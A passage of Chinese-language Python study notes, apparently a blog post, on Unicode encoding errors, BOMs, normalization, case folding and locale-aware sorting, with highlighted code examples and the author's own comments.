class="hljs-string">&#x27;\t&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">latin_1 b&#x27;El Ni\xf1o&#x27;</span><br><span class="hljs-string">utf_8   b&#x27;El Ni\xc3\xb1o&#x27;</span><br><span class="hljs-string">utf_16  b&#x27;\xff\xfeE\x00l\x00 \x00N\x00i\x00\xf1\x00o\x00&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="44-了解编解码问题"><a class="markdownIt-Anchor" href="#44-了解编解码问题"></a> 4.4 了解编解码问题</h1><p>多数非 UTF 编解码器只能处理 Unicode 字符的一小部分子集。把文本转 换成字节序列时，如果目标编码中没有定义某个字符，那就会抛出 UnicodeEncodeError 异常，除非把 errors 参数传给编码方法或函数，对错误进行特殊处理.</p><h2 id="441-处理unicodeencodeerror"><a class="markdownIt-Anchor" href="#441-处理unicodeencodeerror"></a> 4.4.1 处理UnicodeEncodeError</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">city = <span class="hljs-string">&#x27;São Paulo&#x27;</span><br><span class="hljs-built_in">print</span>( city.encode(<span class="hljs-string">&#x27;utf_8&#x27;</span>))<br><span class="hljs-built_in">print</span>(city.encode(<span class="hljs-string">&#x27;utf_16&#x27;</span>))<br><span class="hljs-built_in">print</span>(city.encode(<span class="hljs-string">&#x27;utf_?&#x27;</span>)) <span class="hljs-comment">#这个能解码大多数字符？</span><br><span class="hljs-comment">#3个处理异常的方式，1.忽略，2.替代成？3.使用xml实体</span><br><span class="hljs-built_in">print</span>(city.encode(<span class="hljs-string">&#x27;cp437&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>) )<br><span class="hljs-built_in">print</span>(city.encode(<span class="hljs-string">&#x27;cp437&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>))<br><span class="hljs-built_in">print</span>(city.encode(<span class="hljs-string">&#x27;cp437&#x27;</span>, errors=<span class="hljs-string">&#x27;xmlcharrefreplace&#x27;</span>))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b&#x27;So Paulo&#x27;</span><br><span class="hljs-string">b&#x27;S?o Paulo&#x27;</span><br><span class="hljs-string">b&#x27;S&amp;#227;o Paulo&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="442-处理unicodedecodeerror"><a class="markdownIt-Anchor" href="#442-处理unicodedecodeerror"></a> 4.4.2 处理UnicodeDecodeError</h2><p>不是每一个字节都包含有效的 ASCII 字符，也不是每一个字符序列都是 有效的 UTF-8 或 UTF-16。因此，把二进制序列转换成文本时，如果假 设是这两个编码中的一个，遇到无法转换的字节序列时会抛出 UnicodeDecodeError。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">octets = <span class="hljs-string">b&#x27;Montr\xe9al&#x27;</span>  <span class="hljs-comment">#这些字节序列是使用 latin1 编码的“Montréal”；&#x27;\xe9&#x27; 字节对应“é”。</span><br><span class="hljs-built_in">print</span>(octets.decode(<span class="hljs-string">&#x27;cp1252&#x27;</span>))<br><span class="hljs-comment">#Montréal</span><br><span class="hljs-comment">#可以使用 &#x27;cp1252&#x27;（Windows 1252）解码，因为它是 latin1 的有效超集。</span><br><span class="hljs-built_in">print</span>(octets.decode(<span class="hljs-string">&#x27;iso8859_7&#x27;</span>))<br><span class="hljs-comment">#Montrιal</span><br><span class="hljs-comment">#ISO-8859-7 用于编码希腊文，因此无法正确解释 &#x27;\xe9&#x27; 字节，而且没有抛出错误。</span><br><span class="hljs-built_in">print</span>(octets.decode(<span class="hljs-string">&#x27;utf_8&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>))<br><span class="hljs-comment">#Montr�al</span><br><span class="hljs-comment">#使用 &#x27;replace&#x27; 错误处理方式，\xe9 替换成了“ ”（码位是U+FFFD），这是官方指定的 REPLACEMENT CHARACTER（替换字符），表示未知字符。</span><br></code></pre></td></tr></table></figure><h2 id="443-使用预期之外的编码加载模块时抛出的-syntaxerror"><a class="markdownIt-Anchor" href="#443-使用预期之外的编码加载模块时抛出的-syntaxerror"></a> 4.4.3 使用预期之外的编码加载模块时抛出的 SyntaxError</h2><p>Python 3 默认使用 UTF-8 编码源码，Python 2（从 2.5 开始）则默认使用 ASCII**。如果加载的 .py 模块中包含 UTF-8 之外的数据，而且没有声明编码，会得到类似下面的消息：**</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">SyntaxError: Non-UTF-<span class="hljs-number">8</span> code starting with <span class="hljs-string">&#x27;\xe1&#x27;</span> <span class="hljs-keyword">in</span> file ola.py on line<br><span class="hljs-number">1</span>, but no encoding declared; see http:<span class="hljs-regexp">//</span>python.org<span class="hljs-regexp">/dev/</span>peps<span class="hljs-regexp">/pep-0263/</span><br><span class="hljs-keyword">for</span> detail<br></code></pre></td></tr></table></figure><p>解决,在文件顶部添加一个<strong>coding 注释</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding: cp1252</span><br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;Olá, Mundo!&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="444-如何找出字节序列的编码chardet库"><a class="markdownIt-Anchor" href="#444-如何找出字节序列的编码chardet库"></a> 4.4.4 如何找出字节序列的编码(Chardet库)</h2><p>统一字符编码侦测包 <strong>Chardet</strong>（<a href="https://pypi.python.org/pypi/chardet%EF%BC%89%E5%B0%B1%E6%98%AF">https://pypi.python.org/pypi/chardet）就是</a> 这样工作的，它能识别所支持的 30 种编码。Chardet 是一个 Python 库， 可以在程序中使用，不过它也提供了命令行工具 chardetect。</p><h2 id="445-bom有用的鬼符"><a class="markdownIt-Anchor" href="#445-bom有用的鬼符"></a> 4.4.5 BOM：有用的鬼符</h2><p>UTF-16 编码的序列开头有几个额外的字节，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">u16 = <span class="hljs-string">&#x27;El Niño&#x27;</span>.encode(<span class="hljs-string">&#x27;utf_16&#x27;</span>)<br><span class="hljs-built_in">print</span>(u16)<br><span class="hljs-comment">#b&#x27;\xff\xfeE\x00l\x00 \x00N\x00i\x00\xf1\x00o\x00&#x27;</span><br><span class="hljs-comment">#b&#x27;\xff\xfe&#x27;。这是 BOM，即字节序标记（byte-ordermark），指明编码时使用 Intel CPU 的小字节序。</span><br></code></pre></td></tr></table></figure><p>在小字节序设备中，各个码位的最低有效字节在前面：字母 ‘E’ 的码位 是 U+0045（十进制数 69），在字节偏移的第 2 位和第 3 位编码为 69 和 0。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(u16)</span></span>)<br>#<span class="hljs-selector-attr">[255, 254, 69, 0, 108, 0, 32, 0, 78, 0, 105, 0, 241, 0, 111, 0]</span>  <br><span class="hljs-selector-id">#FF</span> FE <span class="hljs-number">69</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>UTF-16 编码在要编码的文本前面加上特殊的不可见字 符 ZERO WIDTH NO-BREAK SPACE（U+FEFF）。在小字节序系统中， 这个字符编码为 b’\xff\xfe’（十进制数 255, 254）。</p><p>UTF-16 有两个变种：UTF-16LE，显式指明使用小字节序；UTF-16BE， 显式指明使用大字节序。如果使用这两个变种，不会生成 BOM：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-string">&#x27;El Niño&#x27;</span>.encode(<span class="hljs-string">&#x27;utf_16le&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(<span class="hljs-string">&#x27;El Niño&#x27;</span>.encode(<span class="hljs-string">&#x27;utf_16be&#x27;</span>)))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[69, 0, 108, 0, 32, 0, 78, 0, 105, 0, 241, 0, 111, 0]</span><br><span class="hljs-string">[0, 69, 0, 108, 0, 32, 0, 78, 0, 105, 0, 241, 0, 111]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>如果有 BOM，UTF-16 编解码器会将其过滤掉</strong>，为你提供没有前导 ZERO WIDTH NO-BREAK SPACE 字符的真正文本。根据标准，如果文件 使用 UTF-16 编码，而且<strong>没有 BOM</strong>，<strong>那么应该假定它使用的是 UTF-16BE（大字节序）编码</strong>。然而，Intel x86 架构用的是小字节序，因此有 很多文件用的是不带 BOM 的小字节序 UTF-16 编码。 与<strong>字节序有关的问题只对一个字（word）占多个字节的编码（如 UTF-16 和 UTF-32）有影响</strong>。<strong>UTF-8 的一大优势是，不管设备使用哪种字节序，生成的字节序列始终一致</strong>，**因此不需要 BOM。**尽管如此，某些 Windows 应用（尤其是 Notepad）依然会在 UTF-8 编码的文件中添加 BOM；而且，Excel 会根据有没有 BOM 确定文件是不是 UTF-8 编码， 否则，它假设内容使用 Windows 代码页（codepage）编码。**UTF-8 编码 的 U+FEFF 字符是一个三字节序列：b’\xef\xbb\xbf’。**因此，如果文 件以这三个字节开头，有可能是带有 BOM 的 UTF-8 文件。然而， <strong>Python 不会因为文件以 b’\xef\xbb\xbf’ 开头就自动假定它是 UTF-8 编码的。</strong></p><h1 id="45-处理文本文件"><a class="markdownIt-Anchor" href="#45-处理文本文件"></a> 4.5 处理文本文件</h1><p>处理文本的最佳实践是“Unicode 三明治”（如图 4-2 所示）。 意思是， <strong>要尽早把输入（例如读取文件时）的字节序列解码成字符串</strong>。这种三明治中的“肉片”是程序的业务逻辑，在这里只能处理字符串对象。在其他处理过程中，一定不能编码或解码。<strong>对输出来说，则要尽量晚地把字符串编码成字节序列。</strong></p><p>在 Python 3 中能轻松地采纳 Unicode 三明治的建议，因为内置的 open 函数会在读取文件时做必要的解码，以文本模式写入文件时还会做必要 的编码，所以调用 <strong>my_file.read() 方法得到的以及传给 my_file.write(text) 方法的都是字符串对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cafe.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf_8&#x27;</span>).write(<span class="hljs-string">&#x27;café&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cafe.txt&#x27;</span>).read())<br><span class="hljs-comment">#caf茅</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cafe.txt&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf_8&#x27;</span>).read())<br><span class="hljs-comment">#&#x27;café&#x27;</span><br></code></pre></td></tr></table></figure><p>写入文件时指定了 UTF-8 编码，但是读取文件时没有这么做， 因此 Python 假定要使用系统默认的编码（Windows 1252），于是文件的 最后一个字节解码成了字符 ‘Ã©’，而不是 ‘é’。(我这vscode输出茅，输出的末尾多了变成了b’caf\xe8\x8c\x85’，也可能win11或者py3.9默认编码变了？<strong>后续测试是cp936编码</strong>)</p><p>仔细分析在 Windows 中运行的示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cafe.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf_8&#x27;</span>))<br><span class="hljs-comment">#&lt;_io.TextIOWrapper name=&#x27;cafe.txt&#x27; mode=&#x27;w&#x27; encoding=&#x27;utf_8&#x27;&gt;</span><br><span class="hljs-comment">#默认情况下，open 函数采用文本模式，返回一个 TextIOWrapper对象。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cafe.txt&#x27;</span>))<br><span class="hljs-comment">#&lt;_io.TextIOWrapper name=&#x27;cafe.txt&#x27; mode=&#x27;r&#x27; encoding=&#x27;cp936&#x27;&gt;</span><br><span class="hljs-comment">#这里说明默认打开使用的是cp936编码</span><br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cafe.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf_8&#x27;</span>).read() <span class="hljs-comment">#&#x27;rb&#x27; 标志指明在二进制模式中读取文件。</span><br><span class="hljs-built_in">print</span>(fp)<br><span class="hljs-comment">#café</span><br></code></pre></td></tr></table></figure><p>使用encoding='utf_8’打开则是对的</p><p><strong>有几个设置对 Python I/O 的编码默认值有影响</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys, locale<br>expressions = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">locale.getpreferredencoding()</span><br><span class="hljs-string">type(my_file)</span><br><span class="hljs-string">my_file.encoding</span><br><span class="hljs-string">sys.stdout.isatty()</span><br><span class="hljs-string">sys.stdout.encoding</span><br><span class="hljs-string">sys.stdin.isatty()</span><br><span class="hljs-string">sys.stdin.encoding</span><br><span class="hljs-string">sys.stderr.isatty()</span><br><span class="hljs-string">sys.stderr.encoding</span><br><span class="hljs-string">sys.getdefaultencoding()</span><br><span class="hljs-string">sys.getfilesystemencoding()</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> expression <span class="hljs-keyword">in</span> expressions.split():<br>    <br>    value = <span class="hljs-built_in">eval</span>(expression)<br>    <span class="hljs-built_in">print</span>(expression,value)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;locale.getpreferredencoding() cp936</span><br><span class="hljs-string">type(my_file) &lt;class &#x27;_io.TextIOWrapper&#x27;&gt;</span><br><span class="hljs-string">my_file.encoding cp936</span><br><span class="hljs-string">sys.stdout.isatty() True</span><br><span class="hljs-string">sys.stdout.encoding utf-8</span><br><span class="hljs-string">sys.stdin.isatty() True</span><br><span class="hljs-string">sys.stdin.encoding utf-8</span><br><span class="hljs-string">sys.stderr.isatty() True</span><br><span class="hljs-string">sys.stderr.encoding utf-8</span><br><span class="hljs-string">sys.getdefaultencoding() utf-8</span><br><span class="hljs-string">sys.getfilesystemencoding() utf-8&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="46-为了正确比较而规范化unicode字符串"><a class="markdownIt-Anchor" href="#46-为了正确比较而规范化unicode字符串"></a> 4.6 为了正确比较而规范化Unicode字符串</h1><p>因为 Unicode 有组合字符（变音符号和附加到前一个字符上的记号，打 印时作为一个整体），所以字符串比较起来很复杂。 例如，“café”这个词可以使用两种方式构成，分别有 4 个和 5 个码位， 但是结果完全一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">s1 = <span class="hljs-string">&#x27;café&#x27;</span><br>s2 = <span class="hljs-string">&#x27;cafe\u0301&#x27;</span><br><span class="hljs-built_in">print</span>(s1,s2)<br><span class="hljs-comment">#café café</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s1),<span class="hljs-built_in">len</span>(s2))<br><span class="hljs-built_in">print</span>(s1 == s2)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">café café</span><br><span class="hljs-string">4 5</span><br><span class="hljs-string">False</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>U+0301 是 COMBINING ACUTE ACCENT，加在“e”后面得到“é”。在 Unicode 标准中，‘é’ 和 ‘e\u0301’ 这样的序列叫“标准等价 物”（canonical equivalent），应用程序应该把它们视作相同的字符。但 是，Python 看到的是不同的码位序列，因此判定二者不相等。 这个问题的解决方案是使用 unicodedata.normalize 函数提供的 Unicode 规范化。这个函数的第一个参数是这 4 个字符串中的一 个：‘NFC’、‘NFD’、‘NFKC’ 和 ‘NFKD’。下面说明前两个。</p><p>NFC（Normalization Form C）使用最少的码位构成等价的字符串，而 NFD 把组合字符分解成基字符和单独的组合字符。这两种规范化方式都 能让比较行为符合预期：<strong>s1,s2同上</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicodedata <span class="hljs-keyword">import</span> normalize<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(normalize(<span class="hljs-string">&#x27;NFC&#x27;</span>,s1)),<span class="hljs-built_in">len</span>(normalize(<span class="hljs-string">&#x27;NFC&#x27;</span>,s2)))<br><span class="hljs-comment">#4 4</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(normalize(<span class="hljs-string">&#x27;NFD&#x27;</span>,s1)),<span class="hljs-built_in">len</span>(normalize(<span class="hljs-string">&#x27;NFD&#x27;</span>,s2)))<br><span class="hljs-comment">#5 5</span><br></code></pre></td></tr></table></figure><p>使用 NFC 时，有些单字符会被规范成另一个单字符。例如，电阻的单位欧姆（Ω）会被规范成希腊字母大写的欧米加。这两个字符在视觉上 是一样的，但是**比较时并不相等，因此要规范化，防止出现意外：  ** <strong>偷懒不敲了</strong></p><img src="/2022/04/13/python%E5%AD%A6%E4%B9%A0-4/image-20220328002138862.png" alt="image-20220328002138862" style="zoom:67%;"><p>**保存文本之前，最好使用 normalize(‘NFC’, user_text) 清洗字符串。**NFC 也是 W3C 的“Character Model for the World Wide Web: String Matching and Searching”规范</p><p>在 NFKC 和 NFKD 形式中，各个兼容字符会被替换成一个或多个“兼容 分解”字符，即便这样有些格式损失，但仍是“首选”表述——理想情况 下，格式化是外部标记的职责，不应该由 Unicode 处理。下面举个例 子。二分之一 ‘½’（U+00BD）经过兼容分解后得到的是三个字符序列 ‘1/2’；微符号 ‘µ’（U+00B5）经过兼容分解后得到的是小写字母 ‘μ’（U+03BC）。<strong>偷懒x2</strong></p><img src="/2022/04/13/python%E5%AD%A6%E4%B9%A0-4/image-20220328231803755.png" alt="image-20220328231803755" style="zoom:67%;"><h2 id="461-大小写折叠"><a class="markdownIt-Anchor" href="#461-大小写折叠"></a> 4.6.1 大小写折叠</h2><p>大小写折叠其实就是把所有文本变成小写，再做些其他转换。这个功能 由 str.casefold() 方法（Python 3.3 新增）支持。 对于只包含 latin1 字符的字符串 s，s.casefold() 得到的结果与 s.lower() 一样，唯有两个例外：微符号 ‘µ’ 会变成小写的希腊字 母“μ”（在多数字体中二者看起来一样）；德语 Eszett（“sharp s”，ß） 会变成“ss”。</p><h2 id="462-规范化文本匹配实用函数"><a class="markdownIt-Anchor" href="#462-规范化文本匹配实用函数"></a> 4.6.2 规范化文本匹配实用函数</h2><p>由前文可知，NFC 和 NFD 可以放心使用，而且能合理比较 Unicode 字 符串。对大多数应用来说，NFC 是最好的规范化形式。不区分大小写的 比较应该使用 str.casefold()。 如果要处理多语言文本，工具箱中应该有示例 4-13 中的 nfc_equal 和 fold_equal 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicodedata <span class="hljs-keyword">import</span> normalize<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">nfc_equal</span>(<span class="hljs-params">str1,str2</span>):</span><br>    <span class="hljs-keyword">return</span> normalize(<span class="hljs-string">&#x27;NFC&#x27;</span>, str1) == normalize(<span class="hljs-string">&#x27;NFC&#x27;</span>, str2)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fold_equal</span>(<span class="hljs-params">str1,str2</span>):</span><br>    <span class="hljs-keyword">return</span> (normalize(<span class="hljs-string">&#x27;NFC&#x27;</span>, str1).casefold() == normalize(<span class="hljs-string">&#x27;NFC&#x27;</span>, str2).casefold())<br><br>s1 = <span class="hljs-string">&#x27;café&#x27;</span><br>s2 = <span class="hljs-string">&#x27;cafe\u0301&#x27;</span><br><span class="hljs-built_in">print</span> (s1 == s2)<br><span class="hljs-built_in">print</span>(nfc_equal(s1, s2))<br><span class="hljs-built_in">print</span>(nfc_equal(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">False</span><br><span class="hljs-string">True</span><br><span class="hljs-string">False</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="463-极端规范化去掉变音符号跳"><a class="markdownIt-Anchor" href="#463-极端规范化去掉变音符号跳"></a> 4.6.3 极端“规范化”：去掉变音符号(跳)</h2><p>Google 搜索涉及很多技术，其中一个显然是忽略变音符号（如重音符、 下加符等），至少在某些情况下会这么做。去掉变音符号不是正确的规 范化方式，因为这往往会改变词的意思，而且可能误判搜索结果。但是 对现实生活却有所帮助：人们有时很懒，或者不知道怎么正确使用变音 符号，而且拼写规则会随时间变化，因此实际语言中的重音经常变来变 去。 除了搜索，去掉变音符号还能让 URL更易于阅读，至少对拉丁语系语 言是如此。下面是维基百科中介绍圣保罗市（São Paulo）的文章的 URL：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><span class="hljs-keyword">import</span> string<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shave_marks</span>(<span class="hljs-params">txt</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;去掉全部变音符号&quot;&quot;&quot;</span><br>        norm_txt = unicodedata.normalize(<span class="hljs-string">&#x27;NFD&#x27;</span>, txt) <br>        shaved = <span class="hljs-string">&#x27;&#x27;</span>.join(c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> norm_txt<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> unicodedata.combining(c)) <br>            <span class="hljs-keyword">return</span> unicodedata.normalize(<span class="hljs-string">&#x27;NFC&#x27;</span>, shaved) <br></code></pre></td></tr></table></figure><h1 id="47-unicode文本排序"><a class="markdownIt-Anchor" href="#47-unicode文本排序"></a> 4.7 Unicode文本排序</h1><p>Python 比较任何类型的序列时，会一一比较序列里的各个元素。对字符 串来说，比较的是码位。可是在比较非 ASCII 字符时，得到的结果不尽如人意。 下面对一个生长在巴西的水果的列表进行排序：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">fruits = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;caju&#x27;</span>, <span class="hljs-string">&#x27;atemoia&#x27;</span>, <span class="hljs-string">&#x27;cajá&#x27;</span>, <span class="hljs-string">&#x27;açaí&#x27;</span>, <span class="hljs-string">&#x27;acerola&#x27;</span>]</span><br><span class="hljs-function"><span class="hljs-title">sorted</span><span class="hljs-params">(fruits)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(fruits)</span></span>#<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;caju&#x27;</span>, <span class="hljs-string">&#x27;atemoia&#x27;</span>, <span class="hljs-string">&#x27;cajá&#x27;</span>, <span class="hljs-string">&#x27;açaí&#x27;</span>, <span class="hljs-string">&#x27;acerola&#x27;</span>]</span><br><br></code></pre></td></tr></table></figure><p>在 Python 中，非 ASCII 文本的标准排序方式是使用 locale.strxfrm 函数，根据 locale 模块的文档 （<a href="https://docs.python.org/3/library/locale.html">https://docs.python.org/3/library/locale.html</a>? highlight=strxfrm#locale.strxfrm），这 个函数会“把字符串转换成适合所 在区域进行比较的形式”。</p><p>使用 locale.strxfrm 函数之前，必须先为应用设定合适的区域设置， 还要祈祷操作系统支持这项设置。在区域设为 pt_BR 的 GNU/Linux（Ubuntu 14.04）中，可以使用示例 4-19 中的命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> locale<br>locale.setlocale(locale.LC_COLLATE,<span class="hljs-string">&#x27;pt_BR.UTF-8&#x27;</span>)<br>fruits = [<span class="hljs-string">&#x27;caju&#x27;</span>, <span class="hljs-string">&#x27;atemoia&#x27;</span>, <span class="hljs-string">&#x27;cajá&#x27;</span>, <span class="hljs-string">&#x27;açaí&#x27;</span>, <span class="hljs-string">&#x27;acerola&#x27;</span>]<br>sorted_fruits = <span class="hljs-built_in">sorted</span>(fruits, key=locale.strxfrm)<br><span class="hljs-built_in">print</span>(sorted_fruits)<br><span class="hljs-comment">#使用 locale.strxfrm 函数做排序键之前，要调用setlocale(LC_COLLATE, «your_locale»)。</span><br><br></code></pre></td></tr></table></figure><p><strong>使用Unicode排序算法排序</strong></p><p>James Tauber，一位高产的 Django 贡献者，他一定是感受到了这一痛 点，因此开发了 PyUCA 库（<a href="https://pypi.python.org/pypi/pyuca/%EF%BC%89%EF%BC%8C%E8%BF%99%E6%98%AF">https://pypi.python.org/pypi/pyuca/），这是</a> Unicode 排序算法（Unicode Collation Algorithm，UCA）的纯 Python 实现。</p><p><img src="/2022/04/13/python%E5%AD%A6%E4%B9%A0-4/image-20220329200306193.png" alt="image-20220329200306193"></p><h2 id="48-unicode数据库"><a class="markdownIt-Anchor" href="#48-unicode数据库"></a> 4.8 Unicode数据库</h2><p><strong>Unicode 标准提供了一个完整的数据库（许多格式化的文本文件</strong>），不 仅包括码位与字符名称之间的映射，还有各个字符的元数据，以及字符 之间的关系。例如，Unicode 数据库记录了字符是否可以打印、是不是 字母、是不是数字，或者是不是其他数值符号。字符串的 <strong>isidentifier、isprintable、isdecimal 和 isnumeric 等方法</strong>就 是靠这些信息作判断的。 <strong>str.casefold 方法也用到了 Unicode 表中的信息。 unicodedata 模块中有几个函数用于获取字符的元数据</strong>。例如，字符在标准中的官方名称是不是组合字符（如结合波形符构成的变音符号等）， 以及符号对应的人类可读数值（不是码位）。</p><p><a href="http://unicodedata.name">unicodedata.name</a>() 和 unicodedata.numeric() 函数，以及字符串的 .isdecimal() 和 .isnumeric() 方法的用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 